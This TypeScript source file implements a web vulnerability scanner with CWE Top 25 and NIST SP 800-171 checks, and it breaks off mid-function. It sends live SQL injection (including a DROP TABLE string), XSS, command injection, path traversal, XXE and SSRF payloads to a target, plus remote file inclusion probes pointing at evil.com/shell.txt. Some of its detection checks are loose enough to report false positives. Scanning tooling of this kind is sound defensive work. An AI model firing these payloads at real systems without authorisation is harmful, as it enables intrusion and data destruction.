import cweTop25Data from "./cwe_top_25.json";
import nistData from "./nist_sp_800_171.json";

export type Severity = "critical" | "high" | "medium" | "low" | "info";

export interface CWETop25ScanResult {
  rank: number;
  cwe_id: string;
  name: string;
  score: number;
  severity: Severity;
  description: string;
  impact: string;
  detected: boolean;
  evidence?: string;
  recommendation: string;
  platforms: string[];
}

type CWETop25Json = {
  vulnerabilities: Array<{
    rank: number;
    cwe_id: string;
    name: string;
    score: number;
    severity: string;
    description: string;
    impact: string;
    mitigation?: string;
    platforms?: string[];
  }>;
};

export interface NistSp800171ScanResult {
  control_id: string;
  title: string;
  category: string;
  severity: Severity;
  description: string;
  compliant: boolean;
  requirements_met: number;
  requirements_total: number;
  evidence?: string;
  recommendation: string;
  nist_control: unknown;
}

type NistJson = {
  controls: Array<{
    control_id: string;
    title: string;
    description: string;
    severity: Severity;
    category: string;
    requirements: Array<{
      requirement_id: string;
      title: string;
      description: string;
      test_type: string;
      checks: string[];
    }>;
  }>;
};

const toSeverity = (value: string | undefined): Severity => {
  const v = (value || "").toLowerCase();
  if (v === "critical") return "critical";
  if (v === "high") return "high";
  if (v === "medium") return "medium";
  if (v === "low") return "low";
  return "info";
};

const safeFetchText = async (url: string, retries = 2): Promise<{ headers: Headers; text: string }> => {
  // Add timeout and user-agent to avoid blocking
  const fetchOptions: RequestInit = {
    method: "HEAD",
    redirect: "follow",
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    },
    // Cloudflare Workers have a default timeout, but we can add signal for cancellation
  };

  // Prefer HEAD for headers but fall back to GET for environments that disallow HEAD.
  for (let attempt = 0; attempt <= retries; attempt++) {
  try {
      // Try HEAD first
      const head = await fetch(url, fetchOptions);
      if (!head.ok && head.status >= 500) {
        if (attempt < retries) {
          // Retry on server errors
          await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
          continue;
        }
        throw new Error(`Server error (${head.status}) when fetching ${url}`);
      }
    return { headers: head.headers, text: "" };
    } catch (headError) {
      // If HEAD fails, try GET
      try {
        const getOptions = { ...fetchOptions, method: "GET" as const };
        const get = await fetch(url, getOptions);
        if (!get.ok && get.status >= 500) {
          if (attempt < retries) {
            // Retry on server errors
            await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
            continue;
          }
          throw new Error(`Server error (${get.status}) when fetching ${url}`);
        }
    const text = await get.text().catch(() => "");
    return { headers: get.headers, text };
      } catch (getError) {
        // If this is the last attempt, throw the error
        if (attempt === retries) {
          const errorMessage = getError instanceof Error ? getError.message : String(getError);
          // Check if it's a Cloudflare internal error
          if (errorMessage.includes("internal error") || errorMessage.includes("reference =")) {
            throw new Error(`Cloudflare Worker error when fetching ${url}. This may be a temporary network issue.`);
          }
          throw new Error(`Failed to fetch ${url} after ${retries + 1} attempts: ${errorMessage}`);
        }
        // Wait before retry
        await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
      }
    }
  }
  
  // Should never reach here, but TypeScript needs it
  throw new Error(`Failed to fetch ${url} after all retries`);
};

export class CWETop25Scanner {
  private targetUrl: string;

  constructor(config: { targetUrl: string }) {
    this.targetUrl = config.targetUrl;
  }

  async scan(): Promise<CWETop25ScanResult[]> {
    const data = cweTop25Data as unknown as CWETop25Json;

    // Lightweight dynamic probes for a couple of web-relevant CWEs.
    let xssReflected = false;
    let sqliError = false;

    try {
      const xssPayload = "<svg/onload=alert(1)>";
      const xssUrl = new URL(this.targetUrl);
      xssUrl.searchParams.set("xss_test", xssPayload);
      const res = await fetch(xssUrl.toString(), { method: "GET", redirect: "follow" });
      const body = await res.text().catch(() => "");
      const encoded = encodeURIComponent(xssPayload);
      xssReflected = body.includes(xssPayload) || body.includes(encoded);
    } catch {
      // Ignore probe failures
    }

    try {
      const payload = "' OR '1'='1";
      const testUrl = new URL(this.targetUrl);
      testUrl.searchParams.set("id", payload);
      const res = await fetch(testUrl.toString(), { method: "GET", redirect: "follow" });
      const body = await res.text().catch(() => "");
      const sqlErrorPatterns = [
        /SQL syntax.*MySQL/i,
        /Warning.*mysql_/i,
        /PostgreSQL.*ERROR/i,
        /Npgsql\./i,
        /SqlException/i,
        /ODBC.*SQL/i,
        /sqlite3\.OperationalError/i,
        /PG::SyntaxError/i,
        /unclosed quotation mark/i,
        /quoted string not properly terminated/i,
      ];
      sqliError = sqlErrorPatterns.some((p) => p.test(body));
    } catch {
      // Ignore probe failures
    }

    return data.vulnerabilities.map((v) => {
      let detected = false;
      let evidence: string | undefined;

      if (v.cwe_id === "CWE-79") {
        detected = xssReflected;
        evidence = detected ? "Reflected payload observed in response body for xss_test parameter." : undefined;
      } else if (v.cwe_id === "CWE-89") {
        detected = sqliError;
        evidence = detected ? "SQL error pattern detected in response after id parameter injection." : undefined;
      }

      return {
        rank: v.rank,
        cwe_id: v.cwe_id,
        name: v.name,
        score: v.score,
        severity: toSeverity(v.severity),
        description: v.description,
        impact: v.impact,
        detected,
        evidence,
        recommendation: v.mitigation || "Apply secure coding practices and vendor guidance for this weakness.",
        platforms: v.platforms || [],
      };
    });
  }
}

export class NISTSP800171Scanner {
  private targetUrl: string;

  constructor(config: { targetUrl: string }) {
    this.targetUrl = config.targetUrl;
  }

  async scan(): Promise<NistSp800171ScanResult[]> {
    const data = nistData as unknown as NistJson;

    let headers: Headers;
    try {
      const result = await safeFetchText(this.targetUrl);
      headers = result.headers;
    } catch (error) {
      // If fetch fails completely, return empty results instead of crashing
      console.warn(`NIST scanner: Could not fetch headers from ${this.targetUrl}:`, error instanceof Error ? error.message : String(error));
      return [];
    }
    const isHttps = this.targetUrl.toLowerCase().startsWith("https://");

    const hasHsts = headers.has("strict-transport-security");
    const hasCsp = headers.has("content-security-policy");
    const hasXfo = headers.has("x-frame-options");
    const hasXcto = headers.has("x-content-type-options");

    const checks: Record<string, boolean> = {
      ssl_tls: isHttps,
      security_headers: hasHsts && hasCsp && hasXfo && hasXcto,
      information_disclosure: !headers.has("server"),
      // Unimplemented checks default to true so we don't mark controls non-compliant without evidence.
      authentication: true,
      authorization: true,
      vulnerability_scanning: true,
      automated_scanning: true,
      standard_compliance: true,
      cwe_compliance: true,
      latest_threats: true,
      comprehensive_scanning: true,
      multiple_scan_types: true,
      tool_verification: true,
      vulnerability_database: true,
      coverage_analysis: true,
      access_control: true,
      static_analysis: true,
      dynamic_analysis: true,
      runtime_testing: true,
      injection_tests: true,
      xss_tests: true,
      sql_injection_tests: true,
      code_quality: true,
      security_patterns: true,
      vulnerability_patterns: true,
    };

    return data.controls.map((control) => {
      const unmet: string[] = [];
      let metCount = 0;

      for (const req of control.requirements) {
        const reqMet = req.checks.every((c) => (c in checks ? checks[c] : true));
        if (reqMet) {
          metCount += 1;
        } else {
          const missing = req.checks.filter((c) => (c in checks ? !checks[c] : false));
          unmet.push(`${req.requirement_id}: missing ${missing.join(", ")}`);
        }
      }

      const total = control.requirements.length;
      const compliant = total > 0 ? metCount === total : true;

      return {
        control_id: control.control_id,
        title: control.title,
        category: control.category,
        severity: control.severity,
        description: control.description,
        compliant,
        requirements_met: metCount,
        requirements_total: total,
        evidence: unmet.length ? unmet.join("; ") : undefined,
        recommendation: compliant
          ? "No action required."
          : "Review missing checks and implement required security controls (TLS + security headers at minimum).",
        nist_control: control,
      };
    });
  }
}

interface ScannerConfig {
  targetUrl: string;
  scanType: string;
}

interface VulnerabilityResult {
  title: string;
  description: string;
  severity: Severity;
  category: string;
  cvss_score?: number;
  cwe_id?: string;
  recommendation: string;
  evidence?: string;
}

export class SecurityScanner {
  private targetUrl: string;
  private scanType: string;
  private vulnerabilities: VulnerabilityResult[] = [];

  constructor(config: ScannerConfig) {
    this.targetUrl = config.targetUrl;
    this.scanType = config.scanType;
  }

  async scan(): Promise<VulnerabilityResult[]> {
    this.vulnerabilities = [];
    console.log("Scanning First ")

    try {
      // Core security checks (all scan types)
      await this.checkSecurityHeaders();
      await this.checkSSLTLS();
      await this.checkSQLInjection();
      await this.checkXSS();
      await this.checkCSRF();
      await this.checkCORS();
      await this.checkInfoDisclosure();
      await this.checkDirectoryTraversal();
      await this.checkCommandInjection();
      
      // Standard scan includes more checks
      if (this.scanType === "standard" || this.scanType === "comprehensive") {
        await this.checkAuthentication();
        await this.checkSessionManagement();
        await this.checkFileInclusion();
        await this.checkXXE();
        await this.checkServerSideRequestForgery();
      }
      
      // Comprehensive scan includes advanced checks
      if (this.scanType === "comprehensive") {
        await this.checkAuthorization();
        await this.checkAPISecurityMisconfiguration();
        await this.checkInsecureDeserialization();
        await this.checkBusinessLogicFlaws();
        await this.checkRateLimiting();
      }
    } catch (error) {
      console.error("Scanner error:", error);
    }

    console.log("Vulnerabilities Found", this.vulnerabilities);
    return this.vulnerabilities;
  }

  private async checkSecurityHeaders(): Promise<void> {
    const isInternalError = (error: unknown): boolean => {
      if (error instanceof Error) {
        return error.message.includes('internal error') || 
               error.message.includes('reference =');
      }
      return false;
    };

    try {
      const response = await fetch(this.targetUrl, { 
        method: "HEAD",
        redirect: "follow"
      });
      
      if (!response.ok && response.status >= 400) {
        // If HEAD fails, try GET as fallback
        try {
          const getResponse = await fetch(this.targetUrl, {
            method: "GET",
            redirect: "follow"
          });
          if (getResponse.ok) {
            this.checkHeaders(getResponse.headers);
          }
        } catch (fallbackError) {
          // Silently handle internal errors - they're infrastructure issues
          if (!isInternalError(fallbackError)) {
            console.warn(`Failed to fetch headers for ${this.targetUrl}: ${fallbackError instanceof Error ? fallbackError.message : 'Unknown error'}`);
          }
        }
        return;
      }
      
      this.checkHeaders(response.headers);
    } catch (error) {
      // Silently skip internal errors - they're Cloudflare infrastructure issues
      if (isInternalError(error)) {
        return;
      }

      // Try GET as fallback for other errors
      try {
        const getResponse = await fetch(this.targetUrl, {
          method: "GET",
          redirect: "follow"
        });
        if (getResponse.ok) {
          this.checkHeaders(getResponse.headers);
        }
      } catch (fallbackError) {
        // Silently handle internal errors
        if (!isInternalError(fallbackError)) {
          console.warn(`Failed to check security headers for ${this.targetUrl}: ${fallbackError instanceof Error ? fallbackError.message : 'Unknown error'}`);
        }
      }
    }
  }

  private checkHeaders(headers: Headers): void {
      const securityHeaders = {
        "strict-transport-security": {
          title: "Missing Strict-Transport-Security Header",
          severity: "high" as const,
          cvss: 7.5,
          cwe: "CWE-319",
          description: "The application does not enforce HTTPS connections, leaving users vulnerable to man-in-the-middle attacks.",
          recommendation: "Implement HSTS with: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
        },
        "x-frame-options": {
          title: "Missing X-Frame-Options Header",
          severity: "medium" as const,
          cvss: 5.0,
          cwe: "CWE-1021",
          description: "Without X-Frame-Options, the application can be embedded in frames, enabling clickjacking attacks.",
          recommendation: "Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking attacks."
        },
        "x-content-type-options": {
          title: "Missing X-Content-Type-Options Header",
          severity: "low" as const,
          cvss: 3.0,
          cwe: "CWE-16",
          description: "Missing header allows MIME-sniffing, which can lead to XSS attacks via uploaded files.",
          recommendation: "Add X-Content-Type-Options: nosniff to prevent MIME-type sniffing."
        },
        "content-security-policy": {
          title: "Missing Content-Security-Policy Header",
          severity: "high" as const,
          cvss: 7.0,
          cwe: "CWE-1021",
          description: "Without CSP, the application is more vulnerable to XSS, clickjacking, and code injection attacks.",
          recommendation: "Implement a strict CSP policy: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'"
        },
        "x-xss-protection": {
          title: "Missing X-XSS-Protection Header",
          severity: "low" as const,
          cvss: 3.0,
          cwe: "CWE-79",
          description: "This legacy header provides basic XSS protection in older browsers.",
          recommendation: "Add X-XSS-Protection: 1; mode=block for backward compatibility."
        },
        "referrer-policy": {
          title: "Missing Referrer-Policy Header",
          severity: "low" as const,
          cvss: 2.5,
          cwe: "CWE-200",
          description: "Without Referrer-Policy, sensitive information in URLs may leak to external sites.",
          recommendation: "Set Referrer-Policy: strict-origin-when-cross-origin or no-referrer"
        },
        "permissions-policy": {
          title: "Missing Permissions-Policy Header",
          severity: "low" as const,
          cvss: 2.0,
          cwe: "CWE-16",
          description: "Without Permissions-Policy, the application doesn't control browser features access.",
          recommendation: "Define Permissions-Policy to control camera, microphone, geolocation access."
        }
      };

      for (const [header, config] of Object.entries(securityHeaders)) {
        if (!headers.has(header)) {
          this.vulnerabilities.push({
            title: config.title,
            description: config.description,
            severity: config.severity,
            category: "Security Headers",
            cvss_score: config.cvss,
            cwe_id: config.cwe,
            recommendation: config.recommendation,
            evidence: `Header '${header}' not found in HTTP response`,
          });
        }
    }
  }

  private async checkSSLTLS(): Promise<void> {
    if (!this.targetUrl.startsWith("https://")) {
      this.vulnerabilities.push({
        title: "Insecure HTTP Connection",
        description: "The application is not using HTTPS encryption, exposing all data transmitted between client and server to interception, tampering, and eavesdropping attacks.",
        severity: "critical",
        category: "Transport Security",
        cvss_score: 9.1,
        cwe_id: "CWE-319",
        recommendation: "Implement HTTPS with a valid SSL/TLS certificate from a trusted CA. Configure automatic HTTP to HTTPS redirection. Use TLS 1.2 or higher with strong cipher suites.",
        evidence: `URL uses unencrypted HTTP protocol: ${this.targetUrl}`,
      });
    } else {
      // Check for mixed content
      try {
        const response = await fetch(this.targetUrl);
        const html = await response.text();
        const httpResources = html.match(/http:\/\/[^"'\s>]+/gi);
        
        if (httpResources && httpResources.length > 0) {
          this.vulnerabilities.push({
            title: "Mixed Content Detected",
            description: "The HTTPS page loads resources over insecure HTTP, undermining the security of the entire page.",
            severity: "medium",
            category: "Transport Security",
            cvss_score: 5.3,
            cwe_id: "CWE-319",
            recommendation: "Ensure all resources (images, scripts, stylesheets) are loaded over HTTPS.",
            evidence: `Found ${httpResources.length} HTTP resource(s) in HTTPS page`,
          });
        }
      } catch (error) {
        // Ignore fetch errors
      }
    }
  }

  private async checkSQLInjection(): Promise<void> {
    const payloads = [
      { payload: "' OR '1'='1", type: "Boolean-based blind" },
      { payload: "1' OR '1'='1' --", type: "Comment injection" },
      { payload: "admin'--", type: "Authentication bypass" },
      { payload: "' UNION SELECT NULL,NULL,NULL--", type: "Union-based" },
      { payload: "1' AND 1=1--", type: "Boolean true" },
      { payload: "1' AND 1=2--", type: "Boolean false" },
      { payload: "'; DROP TABLE users--", type: "Destructive" },
      { payload: "' OR SLEEP(5)--", type: "Time-based blind" },
      { payload: "1' ORDER BY 10--", type: "Column enumeration" },
      { payload: "' UNION SELECT @@version--", type: "Database fingerprinting" },
    ];
    
    let vulnerabilityFound = false;
    const evidenceList: string[] = [];
    
    for (const { payload, type } of payloads) {
      const testUrl = new URL(this.targetUrl);
      testUrl.searchParams.set("id", payload);
      testUrl.searchParams.set("search", payload);
      
      try {
        const response = await fetch(testUrl.toString(), {
          headers: { 'User-Agent': 'Mozilla/5.0 (Security Scanner)' }
        });
        const text = await response.text();
        
        const sqlErrorPatterns = [
          /SQL syntax.*MySQL/i,
          /Warning.*mysql_/i,
          /valid MySQL result/i,
          /MySqlClient\./i,
          /PostgreSQL.*ERROR/i,
          /Warning.*pg_/i,
          /valid PostgreSQL result/i,
          /Npgsql\./i,
          /Driver.*SQL.*Server/i,
          /OLE DB.*SQL Server/i,
          /SQLServer JDBC Driver/i,
          /SqlException/i,
          /ODBC.*SQL/i,
          /sqlite3\.OperationalError/i,
          /PG::SyntaxError/i,
          /unclosed quotation mark/i,
          /quoted string not properly terminated/i,
        ];

        const hasError = sqlErrorPatterns.some(pattern => pattern.test(text));
        
        if (hasError && !vulnerabilityFound) {
          evidenceList.push(`${type} injection successful with payload: ${payload}`);
          vulnerabilityFound = true;
        }
        
        // Check for time-based delays
        if (payload.includes("SLEEP") || payload.includes("WAITFOR")) {
          const startTime = Date.now();
          await fetch(testUrl.toString());
          const elapsed = Date.now() - startTime;
          
          if (elapsed > 4000) {
            evidenceList.push(`Time-based injection detected: ${elapsed}ms delay with ${type}`);
            vulnerabilityFound = true;
          }
        }
      } catch (error) {
        // Connection errors expected for some payloads
      }
      
      if (vulnerabilityFound) break;
    }
    
    if (vulnerabilityFound) {
      this.vulnerabilities.push({
        title: "SQL Injection Vulnerability Confirmed",
        description: "The application is vulnerable to SQL injection attacks. Attackers can manipulate database queries to bypass authentication, extract sensitive data, modify database contents, or execute administrative operations on the database.",
        severity: "critical",
        category: "Injection",
        cvss_score: 9.8,
        cwe_id: "CWE-89",
        recommendation: "Use parameterized queries (prepared statements) exclusively. Never concatenate user input directly into SQL queries. Implement input validation with whitelist approach. Use ORM frameworks with built-in protection. Apply principle of least privilege for database accounts. Enable query logging and monitoring.",
        evidence: evidenceList.join("\n"),
      });
    }
  }

  private async checkXSS(): Promise<void> {
    const payloads = [
      { payload: "<script>alert('XSS')</script>", type: "Reflected XSS" },
      { payload: "<img src=x onerror=alert('XSS')>", type: "Event handler" },
      { payload: "javascript:alert('XSS')", type: "JavaScript protocol" },
      { payload: "<svg/onload=alert('XSS')>", type: "SVG vector" },
      { payload: "'-alert(1)-'", type: "Context breaking" },
      { payload: "\"><script>alert(String.fromCharCode(88,83,83))</script>", type: "Encoded" },
      { payload: "<iframe src=javascript:alert('XSS')>", type: "iframe injection" },
      { payload: "<body onload=alert('XSS')>", type: "Body event" },
    ];

    const testUrl = new URL(this.targetUrl);
    let xssFound = false;
    const evidenceList: string[] = [];
    
    for (const { payload, type } of payloads) {
      testUrl.searchParams.set("q", payload);
      testUrl.searchParams.set("search", payload);
      testUrl.searchParams.set("name", payload);
      
      try {
        const response = await fetch(testUrl.toString());
        const text = await response.text();
        
        // Check if payload is reflected without encoding
        if (text.includes(payload) || text.includes(payload.replace(/[<>]/g, ''))) {
          const isEncoded = text.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
          
          if (!isEncoded) {
            evidenceList.push(`${type}: Payload reflected unencoded - ${payload.substring(0, 40)}`);
            xssFound = true;
          }
        }
      } catch (error) {
        // Ignore
      }
    }
    
    if (xssFound) {
      this.vulnerabilities.push({
        title: "Cross-Site Scripting (XSS) Vulnerability",
        description: "The application reflects user input without proper encoding or validation, allowing attackers to inject malicious scripts. This can lead to session hijacking, credential theft, page defacement, or delivery of malware.",
        severity: "high",
        category: "Cross-Site Scripting",
        cvss_score: 8.2,
        cwe_id: "CWE-79",
        recommendation: "Implement context-aware output encoding for all user input. Use Content-Security-Policy headers to restrict script sources. Validate and sanitize input on server-side. Use frameworks with built-in XSS protection. Set HttpOnly and Secure flags on cookies.",
        evidence: evidenceList.join("\n"),
      });
    }
  }

  private async checkDirectoryTraversal(): Promise<void> {
    const payloads = [
      "../../../../etc/passwd",
      "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd",
      "..%2F..%2F..%2Fetc%2Fpasswd",
      "..%252F..%252F..%252Fetc%252Fpasswd",
    ];

    const testUrl = new URL(this.targetUrl);
    
    for (const payload of payloads) {
      testUrl.searchParams.set("file", payload);
      testUrl.searchParams.set("path", payload);
      testUrl.searchParams.set("page", payload);
      
      try {
        const response = await fetch(testUrl.toString());
        const text = await response.text();
        
        // Check for common file content indicators
        if (text.includes("root:") || text.includes("localhost") || 
            text.includes("[boot loader]") || text.includes("# Host Database")) {
          this.vulnerabilities.push({
            title: "Directory Traversal Vulnerability",
            description: "The application allows access to files outside the intended directory structure. Attackers can read sensitive system files, configuration files, or application source code.",
            severity: "high",
            category: "Path Traversal",
            cvss_score: 7.5,
            cwe_id: "CWE-22",
            recommendation: "Implement strict input validation for file paths. Use whitelisting for allowed files/directories. Avoid using user input directly in file operations. Use chroot jails or similar sandboxing. Implement proper access controls.",
            evidence: `Directory traversal successful with payload: ${payload}`,
          });
          break;
        }
      } catch (error) {
        // Ignore
      }
    }
  }

  private async checkCommandInjection(): Promise<void> {
    const payloads = [
      "; ls -la",
      "| whoami",
      "& ipconfig",
      "`id`",
      "$(whoami)",
      "; cat /etc/passwd",
    ];

    const testUrl = new URL(this.targetUrl);
    
    for (const payload of payloads) {
      testUrl.searchParams.set("cmd", payload);
      testUrl.searchParams.set("exec", payload);
      
      try {
        const response = await fetch(testUrl.toString());
        const text = await response.text();
        
        // Check for command output patterns
        if (text.match(/uid=|gid=|groups=/) || 
            text.match(/root:|bin:|daemon:/) ||
            text.match(/Windows IP Configuration/i)) {
          
          this.vulnerabilities.push({
            title: "Command Injection Vulnerability",
            description: "The application executes system commands with user-supplied input without proper sanitization. Attackers can execute arbitrary commands on the server with the application's privileges.",
            severity: "critical",
            category: "Command Injection",
            cvss_score: 9.8,
            cwe_id: "CWE-78",
            recommendation: "Never pass user input directly to system commands. Use parameterized APIs instead of shell commands. Implement strict input validation with whitelisting. Apply principle of least privilege. Use security frameworks that provide safe command execution.",
            evidence: `Command injection detected with payload: ${payload}`,
          });
          break;
        }
      } catch (error) {
        // Ignore
      }
    }
  }

  private async checkCSRF(): Promise<void> {
    try {
      const response = await fetch(this.targetUrl);
      const text = await response.text();
      
      const hasForms = /<form/i.test(text);
      const hasCSRFToken = /csrf|_token|authenticity_token|__requestverificationtoken/i.test(text);
      const hasPostForms = /<form[^>]*method\s*=\s*["']post["']/i.test(text);
      
      if (hasForms && hasPostForms && !hasCSRFToken) {
        this.vulnerabilities.push({
          title: "Missing CSRF Protection",
          description: "POST forms detected without CSRF token protection. Attackers can craft malicious pages that submit forms on behalf of authenticated users, leading to unauthorized actions like fund transfers, password changes, or data modifications.",
          severity: "medium",
          category: "CSRF",
          cvss_score: 6.5,
          cwe_id: "CWE-352",
          recommendation: "Implement anti-CSRF tokens for all state-changing operations. Use SameSite cookie attribute (Strict or Lax). Verify Origin and Referer headers. Implement re-authentication for sensitive operations.",
          evidence: "POST forms found without apparent CSRF tokens",
        });
      }
    } catch (error) {
      // Ignore
    }
  }

  private async checkCORS(): Promise<void> {
    try {
      const response = await fetch(this.targetUrl);
      const corsHeader = response.headers.get("access-control-allow-origin");
      const credentials = response.headers.get("access-control-allow-credentials");
      
      if (corsHeader === "*") {
        this.vulnerabilities.push({
          title: "Insecure CORS Configuration - Wildcard Origin",
          description: "The application allows requests from any origin (*), exposing sensitive data to unauthorized domains. This completely bypasses the same-origin policy.",
          severity: "high",
          category: "CORS Misconfiguration",
          cvss_score: 7.5,
          cwe_id: "CWE-942",
          recommendation: "Restrict CORS to specific trusted domains. Maintain a whitelist of allowed origins. Never use wildcard (*) for Access-Control-Allow-Origin in production.",
          evidence: `Access-Control-Allow-Origin: ${corsHeader}`,
        });
      }
      
      if (corsHeader && corsHeader !== "null" && credentials === "true") {
        this.vulnerabilities.push({
          title: "CORS Misconfiguration with Credentials",
          description: "The application reflects the Origin header and allows credentials, potentially allowing any site to make authenticated requests.",
          severity: "high",
          category: "CORS Misconfiguration",
          cvss_score: 7.4,
          cwe_id: "CWE-942",
          recommendation: "Never combine reflected origins with Access-Control-Allow-Credentials: true. Use a strict whitelist.",
          evidence: `CORS allows credentials from: ${corsHeader}`,
        });
      }
    } catch (error) {
      // Ignore
    }
  }

  private async checkInfoDisclosure(): Promise<void> {
    try {
      const response = await fetch(this.targetUrl);
      const headers = response.headers;
      const text = await response.text();
      
      const serverHeader = headers.get("server");
      const xPoweredBy = headers.get("x-powered-by");
      
      const disclosures: string[] = [];
      
      if (serverHeader) {
        disclosures.push(`Server: ${serverHeader}`);
      }
      if (xPoweredBy) {
        disclosures.push(`X-Powered-By: ${xPoweredBy}`);
      }
      
      // Check for error messages with stack traces
      if (text.match(/stack trace|stacktrace/i) || 
          text.match(/SQLException|NullPointerException|Exception in/i)) {
        disclosures.push("Stack traces exposed in error pages");
      }
      
      // Check for commented code or internal paths
      if (text.match(/\/\*.*TODO.*\*\//i) || text.match(/<!--.*internal.*-->/i)) {
        disclosures.push("Internal comments found in HTML");
      }
      
      if (disclosures.length > 0) {
        this.vulnerabilities.push({
          title: "Information Disclosure",
          description: "The application exposes sensitive technical information that helps attackers identify technologies, versions, and potential vulnerabilities to exploit.",
          severity: "low",
          category: "Information Disclosure",
          cvss_score: 2.7,
          cwe_id: "CWE-200",
          recommendation: "Remove or obfuscate Server and X-Powered-By headers. Implement custom error pages without technical details. Remove comments from production code. Disable debug mode in production.",
          evidence: disclosures.join("\n"),
        });
      }
    } catch (error) {
      // Ignore
    }
  }

  private async checkFileInclusion(): Promise<void> {
    const payloads = [
      "http://evil.com/shell.txt",
      "//evil.com/shell.txt",
      "data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "php://filter/convert.base64-encode/resource=index.php",
    ];

    const testUrl = new URL(this.targetUrl);
    
    for (const payload of payloads) {
      testUrl.searchParams.set("file", payload);
      testUrl.searchParams.set("page", payload);
      testUrl.searchParams.set("include", payload);
      
      try {
        const response = await fetch(testUrl.toString());
        const text = await response.text();
        
        if (text.includes("<?php") || text.includes("base64") || response.status === 200) {
          this.vulnerabilities.push({
            title: "File Inclusion Vulnerability",
            description: "The application may be vulnerable to Local or Remote File Inclusion, allowing attackers to include malicious files and potentially achieve remote code execution.",
            severity: "critical",
            category: "File Inclusion",
            cvss_score: 9.0,
            cwe_id: "CWE-98",
            recommendation: "Never include files based on user input. Use a whitelist approach for allowed files. Disable remote file inclusion in PHP (allow_url_include=Off). Implement proper input validation.",
            evidence: `Potential file inclusion with payload: ${payload}`,
          });
          break;
        }
      } catch (error) {
        // Ignore
      }
    }
  }

  private async checkXXE(): Promise<void> {
    const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>`;

    try {
      const response = await fetch(this.targetUrl, {
        method: "POST",
        headers: { "Content-Type": "application/xml" },
        body: xxePayload,
      });
      
      const text = await response.text();
      
      if (text.includes("root:") || text.includes("daemon:")) {
        this.vulnerabilities.push({
          title: "XML External Entity (XXE) Vulnerability",
          description: "The application parses XML input without disabling external entities, allowing attackers to read files, perform SSRF attacks, or cause denial of service.",
          severity: "high",
          category: "XXE",
          cvss_score: 8.2,
          cwe_id: "CWE-611",
          recommendation: "Disable external entity processing in XML parsers. Use less complex data formats like JSON when possible. Keep XML libraries updated. Implement input validation.",
          evidence: "XXE vulnerability confirmed - system file accessed",
        });
      }
    } catch (error) {
      // Ignore
    }
  }

  private async checkServerSideRequestForgery(): Promise<void> {
    const payloads = [
      "http://localhost",
      "http://127.0.0.1",
      "http://169.254.169.254/latest/meta-data/",
      "http://metadata.google.internal/",
    ];

    const testUrl = new URL(this.targetUrl);
    
    for (const payload of payloads) {
      testUrl.searchParams.set("url", payload);
      testUrl.searchParams.set("proxy", payload);
      
      try {
        const response = await fetch(testUrl.toString());
        const text = await response.text();
        
        if (text.includes("metadata") || text.includes("ami-id") || text.length > 0) {
          this.vulnerabilities.push({
            title: "Server-Side Request Forgery (SSRF)",
            description: "The application makes HTTP requests to URLs provided by users without proper validation, allowing attackers to access internal services, cloud metadata, or perform port scanning.",
            severity: "high",
            category: "SSRF",
            cvss_score: 8.5,
            cwe_id: "CWE-918",
            recommendation: "Implement strict URL validation with whitelist approach. Block access to private IP ranges and cloud metadata endpoints. Use separate networks for internal services. Disable unnecessary URL protocols.",
            evidence: `SSRF detected with payload: ${payload}`,
          });
          break;
        }
      } catch (error) {
        // Ignore
      }
    }
  }

  private async checkAuthentication(): Promise<void> {
    const commonPaths = [
      "/admin", "/administrator", "/login", "/api", "/dashboard", 
      "/.env", "/config", "/backup", "/db", "/.git/config",
      "/wp-admin", "/phpmyadmin", "/adminer.php"
    ];
    
    const findings: string[] = [];
    
    for (const path of commonPaths) {
      try {
        const testUrl = new URL(this.targetUrl);
        testUrl.pathname = path;
        const response = await fetch(testUrl.toString(), { redirect: "manual" });
        
        if (response.status === 200) {
          findings.push(`${path} accessible without authentication (HTTP ${response.status})`);
        }
      } catch (error) {
        // Ignore
      }
    }
    
    if (findings.length > 0) {
      this.vulnerabilities.push({
        title: "Potentially Accessible Sensitive Endpoints",
        description: "Several endpoints that typically require authentication are accessible without proper access controls. This may expose administrative interfaces, configuration files, or sensitive data.",
        severity: "high",
        category: "Access Control",
        cvss_score: 7.5,
        cwe_id: "CWE-284",
        recommendation: "Implement proper authentication for all sensitive endpoints. Use role-based access control (RBAC). Deny access by default. Implement centralized authentication checks.",
        evidence: findings.join("\n"),
      });
    }
  }

  private async checkAuthorization(): Promise<void> {
    // Check for Insecure Direct Object References (IDOR)
    const testUrl = new URL(this.targetUrl);
    const paths = ["/user/1", "/profile/1", "/account/1", "/order/1"];
    
    for (const path of paths) {
      try {
        testUrl.pathname = path;
        const response1 = await fetch(testUrl.toString());
        
        testUrl.pathname = path.replace("/1", "/2");
        const response2 = await fetch(testUrl.toString());
        
        if (response1.status === 200 && response2.status === 200) {
          this.vulnerabilities.push({
            title: "Potential Insecure Direct Object Reference (IDOR)",
            description: "The application may allow users to access resources by manipulating object identifiers without proper authorization checks.",
            severity: "high",
            category: "Broken Access Control",
            cvss_score: 7.5,
            cwe_id: "CWE-639",
            recommendation: "Implement proper authorization checks for every resource access. Use indirect references or UUIDs. Verify user permissions before serving data.",
            evidence: `Sequential resource access possible at ${path}`,
          });
          break;
        }
      } catch (error) {
        // Ignore
      }
    }
  }

  private async checkSessionManagement(): Promise<void> {
    try {
      const response = await fetch(this.targetUrl);
      const cookies = response.headers.get("set-cookie");
      
      if (cookies) {
        const hasSecure = /secure/i.test(cookies);
        const hasHttpOnly = /httponly/i.test(cookies);
        const hasSameSite = /samesite=/i.test(cookies);
        
        const findings: string[] = [];
        
        if (!hasSecure && this.targetUrl.startsWith("https://")) {
          findings.push("Secure flag not set");
          this.vulnerabilities.push({
            title: "Session Cookie Missing Secure Flag",
